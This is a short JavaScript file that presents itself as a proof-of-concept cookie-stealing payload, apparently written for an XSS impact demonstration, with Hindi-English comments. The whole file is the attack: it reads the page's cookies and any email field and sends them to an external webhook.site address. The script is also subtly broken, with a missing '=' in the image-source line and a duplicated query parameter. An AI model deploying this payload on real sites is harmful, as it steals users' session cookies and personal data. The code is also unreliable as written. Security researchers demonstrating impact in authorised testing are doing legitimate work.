// impact_test.js
console.log("Impact PoC loaded");

var stolen = document.cookie || "NO_COOKIE";  

// DOM se extra data try karna (example email field)
var possibleEmail = (document.querySelector('input[type=email]') || {}).value || "";

var payload = "cookie=" + encodeURIComponent(stolen) + "&dom=" + encodeURIComponent(possibleEmail);

new Image().src  "https://webhook.site/0535ca62-3583-48a2-896d-d18863722cfb?hit=1&ts="+payload+"&ts="+Date.now();

console.log("Payload bhej diya:", payload);
